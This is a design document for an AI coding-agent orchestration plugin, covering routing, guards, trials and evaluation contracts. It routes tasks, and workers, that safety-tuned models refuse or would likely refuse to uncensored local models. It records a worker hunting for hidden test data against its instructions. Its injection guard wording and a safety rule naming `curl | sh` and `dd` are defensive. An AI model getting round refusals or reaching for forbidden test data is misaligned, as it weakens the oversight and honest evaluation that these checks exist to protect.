| N5+N5b | classify + profile | §8.1 | role defaults, strict, tier M |
| N6 | pipeline | choice among allowed pipelines | rules (§9) |
| N7 | dispatch | choice among conflict-free batches | rule (flag) |
| N8 | progress | satisfied, in_loop, making_progress | signatures, stall counter |
| N9 | escalate | fix / switch_model / debug / split / replan / ask_user | ladder order |
| N10 | review filter | blocking per finding | without evidence → advisory (flag) |
| N11 | merge | merge_now | gate after each merge (flag) |
| N12 | done | job_satisfied | the verification wave must pass (flag) |
| N13 | permission | answer, needs_user, risk, path_relevance | the user |
| G0 | local-first gate (always local) | sensitive, refusal_likely, injection, harmful | the user |
| G | guards on worker text | injection, harmful (and refusal at runtime) | the user |

Before every node, the policy layer (§22) checks whether the user has fixed or skipped the decision. Each node's
backend (cloud Jev, GLiNER, Open-Jev, rules) is configured per node (§20).

Floors live next to the question wordings in `src/catalog.ts`, and change only together with an eval run.

## 15. Decision journal, eval harness, dataset for a local Jev
- **Journal:**
  - every Jev question, with its exact **state object** (structured JSON, stringified only for the API), the
    question, the options and Jev's probabilities;
  - every decision the user or a rule made without Jev.

  Today's `decisions.jsonl` (`permission` and `routing` entries) grows into this.

- **The journal is also the only observability (2026-10-07).** `ctx.app` has no `log` method on this host, so the
  plugin's `ctx.app?.log?.()` is `undefined` and nothing it logs reaches `opencode.log` — a security layer that cannot
  be audited is not operable. The journal persists, so it carries the operational signal instead:
  - `kind: "plugin"` at every server start, before anything can fail: version, project directory, repository root,
    `rel` offset, and the tool names and agents the delegation hook recognises. This answers "is the plugin loaded and
    what does it think it is doing" without guessing from silence.
  - `delegation-unrecognised` for a `subagent` call the hook will not route, and `isolation-denied` for each write
    refusal by the backstop. Absence of the second record is not a sufficient signal on its own.
  - `finish`, `watchdog`, `checkpoint`, `graph` alongside `permission` and `routing`.

  A healthy first minute after a restart is exactly one `plugin` record and then silence until you delegate; the
  first delegation should add a `routing` entry and a task carrying a `worktree`.
- **Labels**, joined later by job and task id:
  - the user's own decisions (one-hot);
  - the user overriding Jev;
  - outcomes: allowed → task passed or reverted; a watchdog signature fired later → `in_loop` yes;
  - planning-session answers.

  Jev's own answers are soft distillation targets only, marked in `metadata.label_source`.
- **Eval harness:** `npm run eval` replays the journal against changed floors or wordings and reports, per node:
  - the automatic rate,
  - the wrong rate,
  - the calibration.
- **Dataset:**
  - `npm run export-dataset` writes Open-Jev JSONL (`../Open-Jev/docs/data.md`): `id, group_id, split, source,
    state, question, kind, options, target, metadata`.
  - Noul options are `["no", "yes"]`.
  - `group_id` is the job or task, so no task leaks across splits.
- **Transcripts** stay in OpenCode's session store. Tasks keep the session ids.
- **Privacy:** redacted, local only, opt-out per project.

## 16. MVP cut
- **In:**
  - state, FSMs, agenda and rules fallback; the integration branch;
  - the planning session (N1, N2, N2b, N2c, shortcuts, question caps, checkpoint);
  - the planner subagent and N4 split;
  - N5+N5b as one request;
  - N6 with P1 / P2 / P3 / P9;
  - gates, two-axis review, N8 with signatures, the N9 ladder with 3 rungs;
  - the loop watchdog;
  - N13 with profile narrowing;
  - batch-confirmed worker starts;
  - the micromanager read cap;
  - journal, eval harness, dataset export;
  - the model registry with local / cloud routing and live availability (§19);
  - G0 with the four guards, and decision backends per node: typesafe, gliner, rules (§20, §21);
  - the policy and override layer (§22);
  - shadow-mode journaling. GLiNER retraining and promotion follow once shadow data exists.
- **Behind flags until the journal shows the need:**
  - P0, P4–P8 and best-of-N;
  - parallel writers and the merge train (parallel readers from day one);
  - N3's Jev part, N7, N10–N12 as Jev nodes;
  - wayfinder maps, DCP, the memory plugin, otel, plannotator.

## 17. Assumptions and spikes (Phase A, done 2026-10-04)
Run against private `opencode run --standalone` servers with only a spike plugin loaded (OpenCode 2.0.18).
Details are in plan.md, "Phase A results".

| # | Assumption | Result | Consequence |
|---|---|---|---|
| A1 | the plugin sees and steers each user turn | **yes**: `session.hook("prompt")` sees and may rewrite every turn; `session.hook("context")` sees system, messages and tools per provider turn | steer through a system block or `session.synthetic`, never the user's text (it was ignored as an injection) |
| A2 | the plugin starts workers with agent and model | **yes**: `session.create({parentID, title, agent, model, permissions})` → `prompt` → `wait({sessionID})` | workers are plugin sessions; the built-in `subagent` tool is not needed |
| A3 | a custom tool returns output | **yes**, with no output schema (text `content`) or with one (structured `output` + `content`) | `plan_submit`, `job` and a `papers` tool are possible |
| A4 | events, shell in a worktree, interrupt | `session.interrupt` stops a worker at once; `worktree.create({projectID, name})` / `remove` work (worktrees live in `~/.local/share/opencode/worktree/<project>/`, detached unless an existing branch is given; `commands.start` from the project config runs on create); `ctx.event.subscribe` delivered **no** events; there is no `ctx.shell` to run commands | the watchdog reads `tool.execute.before/after` and the `context` hook instead of events; gates run through node's `child_process` in the worktree |
| A5 | the profile can tighten every effect | **yes**: `evaluate` fires for allow and ask (not deny) and can set deny with a message; per-session `permissions` hide denied tools | profiles are session permissions plus the hook; deny tool groups |
| A6 | cc-safety-net imports from the symlinked plugin | **yes**: imports resolve from the real path | embed `checkCommand` as hard rule #0; a deny goes to the user. It adds `find -delete`, `git checkout --`, `dd` to devices and dynamic `curl \| sh`; it lets `sudo` through, which our own rule catches |
| A7 | models see their own tool output and reasoning | **yes** for glm-5.3-flash, qwen3.8-flash, deepseek-v4.1-flash, ornith-u (4060, 17 s) and qwen3.8-u (iGPU, 125 s): correct answer, no re-read, reasoning and tool results stay in context; qwen3:4b on the NPU answered right but skipped the required tool | all stay in the routing table; the NPU model is quick tier only |
| A8 | local availability is readable | llama-swap `/v1/models` (loaded / unloaded) and `/running`; llama-vulkan `/health`, `/props` (n_ctx 16384), `/slots` (`is_processing` for 4 slots); FLM lists only its catalog. A swap took 12–19 s with the file in the page cache (1–2 min cold) | the registry reads these live; the swap cost is about 20 s warm |
| A9 | GLiNER answers fast enough on the CPU | **yes**: about 370 ms for four guard questions on 8 threads, 2–3 s load; zero-shot GLiNER is useless (all about 0.5); the oc-voice fine-tune separates injection and harmful but flags legitimate security work as harmful and knows no `refusal_likely` | a guard fine-tune with hard negatives is required; until then a G0 "yes" only asks the user (§20) |
| A10 | a refusal by a local censored model is detectable | **open**: only the swap time was measured; the refusal probe set comes from the user's own bench cases | `worker_refused` stays designed; its patterns are calibrated on the user's probe set |

A side finding: a private standalone server sometimes hangs at start, before it loads any plugin. The spike
harness retried such runs; the plugin itself is not involved.

### 17.1 Spikes of the 2026-10-06 live run (done 2026-10-07)
| # | assumption | answer | what changed |
|---|---|---|---|
| A11 | a delegation arrives as a `subagent` tool call | **partly**. Nested code-mode calls *are* surfaced individually with their real tool name, and the `subagent` tool is registered `codemode: false`, so a delegation can never arrive nested. What does vary is the **calling agent**: the agent is a property of the session, not of the delegation, so the guard `call.agent !== MICROMANAGER.agent` returned early after the session's agent was switched — silently, with no task, no worktree and no error. Ten workers wrote into the user's checkout. | recognition is by **target** (`delegationRole(call)`, then `routeDelegation`), not by caller; plus an independent backstop that denies writes to any child of a micromanager session that is not a claimed worker, identified by `parentID` — the one signal that holds however the delegation was made |
| A12 | the plugin can log where an operator will see it | **no**. `ctx.app` carries `{name, version, channel}`, no `log`; `console.error` from a plugin does not reach `opencode.log` either | the journal is the channel: a `kind:"plugin"` startup record, `delegation-unrecognised`, `isolation-denied` (§15) |
| A13 | `ctx.session.move` applies before the child's first tool call | **unverified**. The comment in the hook calls it a spike, and nothing reads the directory back | still a spike. The backstop from A11 covers the failure this would allow: a worker that was not moved cannot write |
| A14 | a session can be identified as a delegation without its prompt marker | **yes**, via `ctx.session.get({sessionID}).parentID`. A plugin-recognised delegation rewrites the child's prompt to start with `CHILD_PREFIX`; an unrecognised one has no marker, so the prompt text cannot be the discriminator | the backstop keys on the parent relationship, never on the agent name, so a hand-picked role agent in the user's own checkout is unaffected |
| A15 | the project directory is the git root | **no**. Git materialises a worktree of the repository root | `rel` is computed, persisted and threaded through the worker directory, the gate cwd and `changedFiles` (§11) |
| A16 | `.git/info/exclude` marks the state directory | **only from the repository root**; a subdirectory project wrote nothing and the user saw `?? .jev-micromanager/` | `excludeFromGit` resolves the real exclude file through `git rev-parse --git-common-dir` |

## 18. Code layout (target)
- **New:**
  - `src/state.ts` (types, FSMs, reconcile)
  - `src/agenda.ts`
  - `src/catalog.ts` (wordings and floors)
  - `src/nodes.ts`
  - `src/session.ts` (planning session)
  - `src/profile.ts`
  - `src/pipelines.ts`
  - `src/scheduler.ts`
  - `src/gates.ts`
  - `src/watchdog.ts`
  - `src/brief.ts` (brief, report parser, handoff notes)
  - `src/merge.ts`
  - `src/eval.ts`
  - `src/dataset.ts`
  - `src/registry.ts` (model registry, availability, filter-and-rank)
  - `src/backends.ts` (decision backends per node, shadow mode)
  - `src/policy.ts` (overrides: auto / ask / fixed / rule)
  - `decider/` (the Python GLiNER decision server)
  - `bench/guard_cases.json`
  - `skills/`
- **Reused:**
  - `src/jev.ts`
  - `src/decide.ts` (becomes N13)
  - `src/journal.ts`
  - `src/roles.ts` (the upper bound)
  - `src/routing.ts` (`chooseModel` gets needs and tier)

## 19. Local vs cloud: model registry and routing
**Local fleet (2026-10-04)**, documented in `~/Models/bench/ROSTER.md` and registered as providers in
`~/.config/opencode/opencode.json`:

| Device | Server | Models | Notes |
|---|---|---|---|
| RTX 4060 8 GB | llama-swap `:8000` | `oss-u` (gpt-oss-20b unc, deep), `ornith-u` / `ornith-u-s` (Ornith-1.5-9B unc, agent, vision), `ornith` (censored agent), `mimo` (censored, fast), `qwen3.5-u` (4B unc, quick, vision) | one model at a time; a swap takes 1–2 min |
| Radeon 890M iGPU | llama-vulkan `:8092` | `qwen3.8-u` (27B unc, about 6.5 t/s) | resident |
| XDNA2 NPU | FLM `:52625` | Whisper V3 Turbo (STT), plus at most one small LLM (`qwen3:4b` / `qwen3vl-it:4b`) | reserved for speech; a quick tier only, never agentic work (A7: qwen3:4b skipped the tool it was told to use) |
| cloud | OpenCode Go | glm-5.3-flash, qwen3.8-flash, deepseek-v4.1-flash | long contexts, hard tasks |

Every local model is configured with a 16k context.

**Registry.** `models` in `micromanager.jsonc`. By default it is generated from the providers in `opencode.json`,
with fields added by hand. One entry per model:
- `id`, `provider`;
- `location` (local | cloud), `device` (cuda | igpu | npu | cloud);
- `censored`, `family`, `tier` (quick / agent / deep);
- `vision`, `ctx`, `tokPerSec`;
- `swapGroup`, `resident`, `cost`.

The fixed `MODELS` in `src/roles.ts` become the default entries.

**Routing** is a filter-and-rank over the registry. It replaces the fixed chains in `chooseModel`.
1. **Hard filters:**
   - vision needed → vision models;
   - a context larger than a model's `ctx` excludes it;
   - `sensitive` → local only;
   - `refusal_likely` → local and uncensored only.
2. **Local when capable:** a task whose difficulty tier the local models cover runs locally. Hard tasks, long
   contexts and a busy device go to the cloud.
3. **Availability, read live:**
   - llama-swap `/v1/models` (loaded or unloaded);
   - FLM and llama-vulkan health;
   - the RAM rule (the 27B on the iGPU and a large model on the NPU do not both fit).

   A loaded model beats one that needs a swap.
4. **Per-device concurrency:**
   - A GPU behind llama-swap runs one model at a time, so the scheduler batches tasks by model.
   - Parallel workers spread over the 4060, the iGPU and the cloud. The NPU takes only quick-tier calls.
5. **Reviewer:** another family (Ornith, MiMo, gpt-oss and Qwen are different families). It is local too when the
   task is local-only.

Escalation with locality:
1. fix in the same session;
2. another local model of another family;
3. the cloud, unless the task is local-only;
4. the user.

The brief builder and the watchdog's token limit respect the chosen model's `ctx`. Tasks that do not fit 16k
are split (N4) or go to the cloud.

## 20. Decision backends, the local-first gate and shadow mode
**Backends**, chosen per node, all speaking the Jev wire format (`POST {model, state, questions}`), so
`src/jev.ts` only changes URL and model:

| Backend | Where | Strength |
|---|---|---|
| `typesafe` | TypeSafe cloud Jev | best on fine decisions; the teacher in shadow mode |
| `gliner` | our decision server (GLiNER2, a fine-tune of `fastino/GLiNER2.5-*-Decide`), on the CPU | local; about 370 ms for the four G0 guards on 8 threads (A9); needs our own fine-tune before it decides guards |
| `openjev` | a local Open-Jev server | local, generative-free probabilities; larger |
| `rules` | code | always available |

- **The decision server** is a small Python service (uv, a systemd user unit) on the CPU. The 4060 stays free for
  llama-swap and the NPU for Whisper. It keeps the TypeScript plugin free of Python.
- **Mapping to GLiNER**, after oc-voice's `decision/gliner.py` (a concept, not a code dependency):
  - Choice → a single-label task;
  - Noul → yes/no;
  - Score → an ordinal single-label task over the rubric levels, whose expectation is the score.

  GLiNER reads a short window, so the state puts the task text first.
- **Floors belong to the backend and the wording.** A GLiNER probability is not a Jev confidence.

**G0, the local-first gate.** It always runs on `gliner` and is never sent to the cloud. It answers `sensitive`,
`refusal_likely`, `injection` and `harmful` (§21) on:
- the job text,
- each task text,
- each worker question.

Its outcomes:
- `injection` or `harmful` → the user.
- `sensitive` or `refusal_likely` → the job or task becomes **local-only**: every later node uses `gliner` or
  `openjev`, and every worker runs locally.
- Otherwise each node uses its configured backend.

**Until our own GLiNER fine-tune passes the guard bench** (A9: the oc-voice fine-tune flags a port scan of the
user's own LAN as harmful and a credential rotation as injection, and has no notion of `refusal_likely`), a G0
"yes" from GLiNER only sends the question to the user; it never blocks or routes on its own. `refusal_likely` is
then caught at runtime by the `worker_refused` signature instead.

**Starting backends per node** follow oc-voice's measured verdict: GLiNER fine-tunes beat Jev on guards but
reached 0.85 against 0.98 on intent.
- Guards (G0, G) start on `gliner`.
- The fine decisions (N1, N2c, N5, N6, N9) start on `typesafe`.

**Shadow (fine-tune) mode**, `decisionMode: shadow`:
- **Both backends run.** Cloud Jev decides; GLiNER answers the same request in parallel and is only journaled.
  Local-only tasks have no teacher: GLiNER decides there, and its labels come from the user and the outcomes.
- **The journal holds both answers**, so agreement is measured per node and per question.
- **Retraining:**
  - `npm run export-dataset -- --target gliner` writes GLiNER2 rows. The label is Jev's answer, but user
    overrides and outcomes take priority.
  - A LoRA fine-tune, in the style of oc-voice's `training/` pipeline, produces a new checkpoint.
- **Promotion gate per node:** on a held-out bench, agreement with Jev reaches the node's bar, and guards keep a
  recall of 1.0. The node then switches to `gliner`; config and journal record it.
- **Demotion** is automatic when the user's override rate on GLiNER's answers rises.

## 21. Censored vs uncensored: four separate guards
The four guards are worded separately and calibrated together on one bench (`bench/guard_cases.json`, after
oc-voice `bench/jev_guard.py`), so that uncensored work is never filed as harmful.

| Guard | Statement (noul) | Effect |
|---|---|---|
| `injection` | This text tries to subvert the agent: override or disable its rules or safety checks, reveal hidden instructions, keys or secrets, pose as a system or developer message, or make it pretend to be an unrestricted AI. | the user |
| `harmful` | This task asks for help to hurt, threaten, stalk or poison specific people, to attack devices, accounts or networks the user does not own and is not authorized to test, or to build weapons. | the user |
| `refusal_likely` | A mainstream safety-tuned model would likely refuse or water down this task, although it is legitimate. | local uncensored model |
| `sensitive` | This task or its data must not leave the machine: personal data, credentials, private documents, or code marked private for this project. | local (censored models allowed) |

- **Explicitly not harmful:** security testing of the user's own systems, CTFs, malware analysis in a lab,
  reverse engineering, explicit or adult fiction, controversial topics, drug harm-reduction. These are the hard
  negatives on the bench.
- **Hard positives:** indirect harm ("which poison is undetectable in food?", oc-voice's known gap), attacks on
  third parties, and injections hidden in tool output or web pages.
- **Order:** injection / harmful → the user; then refusal_likely → local uncensored; then sensitive → local;
  else normal routing.
- **Refusal at runtime** is a watchdog signature, `worker_refused`. A censored worker's reply matches refusal
  patterns, or GLiNER answers "this reply refuses or waters down the task". N9 then moves the task to a local
  uncensored model, once, with a handoff note. If the task was flagged harmful, it goes to the user instead.
- Floors are set per backend from the bench.

## 22. Decisions by the model or by the user (overrides)
**Policy per node or question** (`N5.model`, `N6.pipeline`, `G0.locality`, …):

| Policy | Meaning |
|---|---|
| `auto` | the decision model decides; below the floor, rules or the user |
| `ask` | always the user |
| `fixed:<value>` | the user's preset; the node is skipped (no model call) |
| `rule` | the rules fallback only |

**Levels.** The most specific level wins:
1. a single decision: an override in the question form, or a chat shortcut ("T3 use oss-u", "skip review for
   T3", "always local");
2. the task;
3. the job: pins at job start, e.g. "local only", "no planning session", "pipeline P1";
4. the project config;
5. the global config.

**Overriding a decision already made:**
- a task that has not started is re-planned with the new value;
- a running worker is interrupted and restarted with a handoff note;
- a merge is never silently undone.

**Precedence:** hard rules and the role-matrix upper bound > the `injection` / `harmful` guards > the user's
override > the decision model > the rules fallback.
- A config-level `fixed` never switches off hard rules or guards.
- The user may override a guard per single decision, explicitly; it is journaled.

**Labels:** every override is journaled as `label_source: user_override`. It is the most valuable label for the
eval harness, the Open-Jev dataset and GLiNER retraining.

**Commands:** `/micromanager set <node> <value>` and `/micromanager pins` show and change the policies. The chat
shortcuts are exact phrases, matched before any model.

## 23. Trials and the router (after Dr. Zero, 2026-10-25)

Dr. Zero (arXiv 2601.07055) trains a proposer and a solver against each other: the proposer is rewarded for
questions the solver passes in some but not all of n rollouts (0 < k < n), so a curriculum appears by itself, and
HRPO compares rollouts within groups of the same shape (hop count) instead of sampling n per question. On coding
tasks the pieces map as follows: a rollout is a worker attempt in its own worktree, the verifier is the shell gate,
k/n is how many attempts pass, and the group is the task class (role, difficulty tier, number of files).

**Phase 1 (implemented, cloud only).**
- **Difficulty.** Before a writer delegation is routed, the plugin asks Jev N5's one difficulty question
  (`assessDelegation` in src/plugin.ts). A hard task prefers the pool's deep-tier models.
- **Trials (src/trials.ts).** A task runs as `trials` attempts (default 3, capped by `parallel`) when it is hard
  (difficulty ≥ 0.67), when it does failed work over, or when the outcome log says its class mostly fails on a single
  worker (`needsTrials`). The first attempt starts as usual; the plugin's note on its subagent result asks the
  micromanager to start the others with `Attempt: T… · job-…`, because only its subagent calls make children that
  OpenCode reports back to it. Each attempt is a task of its own and avoids its siblings' model families.
- **Settling.** The first attempt that passes its checks and merges wins. Every other attempt is cancelled with
  `replacedBy` set to the winner, so dependants of the first attempt wait for the winner, and its session is
  interrupted and its worktree removed. An attempt that fails while others run reports nothing to act on; when all
  of them failed (k = 0), the note lists what each hit and asks for a split.
- **Outcome log (src/outcomes.ts).** One row per writer end: features known before the start (role, difficulty,
  class, files, checks, brief), the allocation (model, n), and the result (gate, fix rounds, merged, end reason,
  seconds, tokens, cost). Attempts stopped because a sibling won are kept as censored. `export-dataset --target
  router` joins a trial's attempts into one row.

**Phase 2 (later, once local models are back).**
1. **A trained router.** A small local model (e.g. Qwen 1.5–3B) reads the features and outputs tier, n, the families
   and whether to split first. It is trained with GRPO on reward = merged − λ·cost, with advantages normalised inside
   the task class, so no task needs n samples of its own (the HRPO idea).
2. **A proposer.** Synthetic coding tasks from the user's own repositories, with free verifiers: revert a past commit
   and ask for it back (its tests are the check), empty a function body, break a test. A task is worth keeping when
   the current pool solves it in some but not all attempts, which yields a curriculum that follows the pool and more
   router data than real jobs produce.
3. **A stronger verifier.** Attempts also write tests; each attempt's tests run against its siblings' code
   (agreement as in CodeT), to pick a winner where the user's checks are weak.

## 24. Spike: Ralph loops inside one native worker session (2026-10-25)

**Question.** Can a lane be one native subagent session, which stays a child in the TUI tree and is reported by
OpenCode, and start over with a fresh head at a loop boundary, because the plugin resets the context the session's
model sees? The alternative, plugin-made sessions, was ruled out by the user. The code is on branch
`archive/spike-ralph-reset` on GitHub (commit 0901f5b) and is not merged.

**How it was tested.**
- **Loop boundary:** a writer's failed `finish_task` once its fix rounds were used (`fixRounds` 0 in the later runs).
  `finish_task` answers with a handoff (the worker's summary, changed files, the failing checks with output, and "say
  what you will do differently"), and the context manager resets the session at its next request.
- **Two reset shapes:** "stubs" replaces every earlier tool result with a stub. "cut" drops every message between the
  brief and the turn that crossed the boundary, and does so again on every later request.
- **Runs:** headless on a private `opencode serve` with GLM 5.3 Flash and DeepSeek V4.1 Flash. The task was a German
  slugify whose gate also ran held-out cases the worker could not read.

**Results.**

| Run | Resets | Worker went on | Context at the reset (provider tokens) |
|---|---|---|---|
| GLM, stubs | 2 | yes, no provider error | 19.7k → 16.8k (−15%) |
| DeepSeek, stubs | 2 | yes, through all 3 loops | 35.1k → 32.0k (−9%), 62.0k → 60.4k (−3%) |
| DeepSeek, cut | 2 | yes; **merged in loop 3** | 36k → 9k, 38k → 8k (back to system prompt + brief + handoff) |

- **Answer: C can be done, with "cut".** The provider accepts the shortened history, the worker keeps working in the
  same turn loop after the handoff, and the context drops to its starting size at every boundary.
- **"stubs" works mechanically but misses the point.** The assistant's own text and the tool inputs stay; DeepSeek's
  long messages refilled the context within one step.
- **Nothing is lost.** OpenCode keeps the full history: the TUI and the session API show every loop. Only what the
  model gets is cut; the plugin keeps the cut point (`cutAt`) per session.
- **The plugin's estimate is off.** Its `contextTokens` estimate undercounts after a cut, because it counts the dropped
  messages as JSON. Use the provider's numbers.

**What it means for a real feature.** The loop need not be built now; these are the conditions if it is.
- **A failed `finish_task` alone is too rare a trigger.** Good workers run their checks themselves and fix in place.
  Three GLM runs never reached a boundary until fix rounds were set to 0. Better triggers:
  - the N16 checkpoint verdict "fresh" (`making_progress` no, `wrong_approach` yes);
  - watchdog signs: the same check failing again and again, or a circle of tool calls;
  - the context ceiling: start over instead of summarizing.
- **Adaptive checkpoint interval** (decided by the user). The first interval comes from the N5 difficulty, later from
  the outcome log (about the 75th percentile of the steps that merged tasks of the class needed). Watchdog signs pull
  it earlier, and Jev's confidence lengthens or shortens the next one. The outcome log needs the steps per attempt for
  this.
- **Workers try to reach hidden test data.** One worker went looking for the held-out cases although the prompt
  forbade it; the permission layer refused it (shell `cat …/holdout.json`, then a search of `~/.local/share` and
  `~/.config`). Held-out checks need the sandbox and the permission rules, not the prompt.

**Side findings (bugs in the plugin).**
1. **Lost paused shells, fixed on omo-hybrid.** A sandboxed worker's paused shell was never found among OpenCode's
   pending requests: the evaluation had been unwrapped to the worker's own command, the pending request still held
   the bwrap command. The worker (or helper) then waited until its session ended. Both sides are now compared
   unwrapped.
2. **Resume against the sweep, fixed on omo-hybrid.** A worker continued with its sessionID stayed in the plugin's
   `ended` set, so the sweep cancelled its task on disk while it went on. `resume` now takes it out of the set.
3. **Watchdog `same_call`, fixed on omo-hybrid.** It stopped a worker for running the task's own check three times
   with an edit before each. A repeated call now counts only since the last write; a write repeated with the same
   input still counts over the whole window.

## 25. Fitness contracts and the backlog (2026-10-26)

A build task is done when its checks pass. A task with no fixed end ("make the search faster") is never done that
way: it needs a number with a direction, a baseline, and guards against raising the number without improving the
goal. The contract settles that before money is spent, the same way for every domain and every search method (one
worker, a trial, later lanes and an evolver). The plan has seven phases: P1 the contract core, P2 frozen tests on the
native path, P6 the local backlog, P3 `request_check_change`, P4 best-score trials with a held-out corpus, P5 the
contract round (draft, user form, red team, baseline, freeze), P7 GitHub issues as an opt-in backend.

**P1: the contract core (implemented).**
- **The contract (src/contract.ts)** lives on the job (`job.contracts`, ids `C1`, `C2`, …) and in
  `.micromanager/contracts/<job>/<id>.json`; a task references `{id, version}`. It holds the goal, the evaluator, the
  scores with direction and noise band, the guards with a tolerance relative to the baseline, the visible corpus,
  `repeats`, a timeout, the stop rule (`evaluations`, `seconds`), the baseline, what it used, and its history.
- **The evaluator protocol.** One shell command that prints `MM_SCORE {"valid":…,"scores":{…},"cases":{…},
  "category":…}`; the last such line counts. A non-zero exit, a timeout, no line, `"valid":false` or a missing score
  make the result invalid (the hard constraints), which loses to any valid one. A prefixed line rather than bare
  JSON, because test runners print JSON too. The evaluator gets `MM_CORPUS` (visible or heldout) and `MM_REPEAT`; P4
  adds `MM_CORPUS_DIR`.
- **Comparing.** Lexicographic: the first score decides unless two values lie inside its noise band, then the next
  one does. Repeated runs count by their median, and one invalid run makes the measurement invalid.
- **The gate (src/native.ts finish).** The evaluator runs only after the checks pass, in the worker's directory. An
  invalid result or a broken guard is a fix round like a failing check (stage `fitness`); a used-up stop rule blocks
  the worker at once. After a rebase onto newer commits it is measured again. The worker's brief names the contract,
  its scores with today's values, and its guards.
- **Refusal.** N5's ask at a writer delegation carries a second question, `open_ended` (floor 0.8, high on purpose: a
  build task refused costs a turn, an optimization let through only lacks the measurement). An open-ended writer
  without `Contract:` is refused like a writer without checks; so is a contract the job does not have, or one
  without a baseline.
- **The contract tool** stores a contract or a new version of one, and measures the baseline on the job branch at
  once (`costPerEval` too). An evaluator that gives no valid result there leaves the contract without a baseline.
- **The outcome log** keeps the contract's id, version and hash, the last score, and the reward: the first score's
  improvement over the baseline, signed so that better is positive, 0 for an invalid result. `routerRows` carries the
  best reward of a task's attempts. An ordinary check may print `MM_SCORE {"cases":…}` as well, which grades a build
  task (`graded`) without deciding it. Evaluator runs are counted on the job (`counters.evals`, `evalSeconds`).
**P2: frozen tests on the native path (implemented).** Only the runner's P3 pipeline froze tests; a native writer
told "make the test pass" could change the test.
- **What is frozen:** the files a writer's todo or delegation names (`Frozen:`, `"frozen"`), the existing files its
  checks name (`node --test test/a.test.js` freezes the test), and its contract's evaluator script and visible corpus
  (a directory through `git ls-files`). A file of its own write scope is never frozen. They are hashed when it starts
  (`task.frozen`, so a restart keeps them).
- **The gate holds it:** `finish_task` first compares the hashes; a changed, deleted or created frozen file is put
  back before the checks run, so they judge the code against the tests as they were, and the round fails with
  "frozen files unchanged". `frozenCheck` moved from runner.ts to integration.ts; both paths use it.
- **Early feedback:** the permission hook denies an edit, write or patch on a frozen path at once, and the sandbox
  puts the frozen paths into `denyWrite`, so `sed -i` cannot get around it (checked with bubblewrap). The brief lists
  the frozen files. A wrong test is to be named in the report; P3 gives the worker a tool to ask for the change.

**P6: the local backlog (implemented).** Jobs that wait, one Markdown file each in `.micromanager/backlog/<slug>.md`,
committed with the project (src/backlog.ts). Items are jobs, never a job's internal tasks.
- **Format:** a YAML front matter in a small subset the plugin reads and writes itself (scalars, lists, lists of
  one-level maps, JSON values; no YAML dependency): `title`, `status` (draft, ready, running, done, dropped), `order`,
  `kind` (build, fix, optimize), `origin` (user, later, trial-failed), `from`, `job`, `created`, `acceptance`
  (`text`, `verify`), `checks`, `fitness` (a contract as the contract tool takes it). The body is free Markdown. The
  same text is meant to be a GitHub issue body (P7).
- **In git:** the exclude file now reads `**/.micromanager/*` with `!**/.micromanager/backlog/` and
  `!**/.micromanager/contracts/` (a bare `.micromanager/` line from before is replaced: git cannot re-include a file
  below an excluded directory; `**/` because a pattern with a slash is anchored at the repository root). A project the
  plugin made a repository for gets the same lines in its `.gitignore`. A `.gitignore` of the user's own that hides
  the directory is named when drafts are written. Agents may read the backlog and the contracts; only the plugin
  writes them.
- **Drafts at a job's end:** native workers now end their report with `FOLLOWUP: what | why | files` lines; the plugin
  keeps the ones the job has no task for in `job.later`. When the job is merged (`merge_job`) or discarded
  (`discard_job`), each such follow-up and each trial whose attempts all failed and that nothing did over becomes a
  draft, once; the answer names them. Nothing is committed for the user.
- **Starting an item:** `plan_job` with the goal `backlog:<slug>` plans a job from the item's title, goal, acceptance
  points, checks and fitness, and marks the item running; the item is done when that job is merged and ready again
  when it is discarded. The `backlog` tool lists (open first, ready before draft, then by order), shows, adds and
  changes items. There is no runner that works the backlog off by itself.

- **Not yet:** the contract round (P5) and its freeze; until then a contract is a draft the micromanager writes, and
  it should show the baseline to the user before writers start.
- **Known weak spot:** a task's checks are kept as one `verify` string joined with `" && "` and split again after a
  restart, so a check that contains `&&` itself comes back as two. The evaluator is kept out of that path.

## Sources
- **Orchestration:**
  - Magentic-One ledgers (github.com/microsoft/autogen, `_magentic_one`)
  - Task Master (github.com/eyaltoledano/claude-task-master)
  - LLMCompiler (arxiv.org/abs/2312.04511)
  - spec-kit (github.com/github/spec-kit)
  - Kiro specs (kiro.dev/docs/specs)
  - oh-my-openagent (github.com/code-yeongyu/oh-my-openagent)
  - OpenHands stuck detector (github.com/OpenHands/software-agent-sdk)
- **Loops:**
  - Ralph (ghuntley.com/ralph)
  - ralph-wiggum plugin (github.com/anthropics/claude-code/tree/main/plugins)
  - opencode-squad (github.com/GFN-CIS/opencode-squad)
  - anthropic.com/engineering: building-effective-agents, multi-agent-research-system,
    effective-harnesses-for-long-running-agents
  - Reflexion (arxiv.org/abs/2303.11366)
  - AlphaCodium (qodo.ai)
- **Planning and skills:**
  - vibe-wise learn (github.com/nykooi1/vibe-wise)
  - mattpocock skills (github.com/mattpocock/skills)
  - obra/superpowers (github.com/obra/superpowers)
  - caveman (github.com/JuliusBrussee/caveman)
  - opencodeskills.dev
- **Ecosystem:**
  - awesome-opencode (github.com/awesome-opencode/awesome-opencode)
  - cc-safety-net (github.com/kenryu42/claude-code-safety-net)
  - DCP (github.com/Tarquinen/opencode-dynamic-context-pruning)
  - opencode-agent-memory (github.com/joshuadavidthomas/opencode-agent-memory)
  - opencode-workflows (github.com/phall1/opencode-plugins)
  - Serena (github.com/oraios/serena), context7 (github.com/upstash/context7), ast-grep-mcp
    (github.com/ast-grep/ast-grep-mcp)
  - opencode-research-papers (github.com/saim-x/opencode-research-papers)
- **Local models and GLiNER:**
  - `~/Models/bench/ROSTER.md` (local fleet and benchmarks)
  - oc-voice `bench/REPORT_gliner_verdict.md`, `training/README.md`, `src/voice_agent/decision/gliner.py`
- **Jev:**
  - docs.typesafe.ai (several questions per request, answered in parallel and in isolation)
  - Open-Jev data format (`../Open-Jev/docs/data.md`)
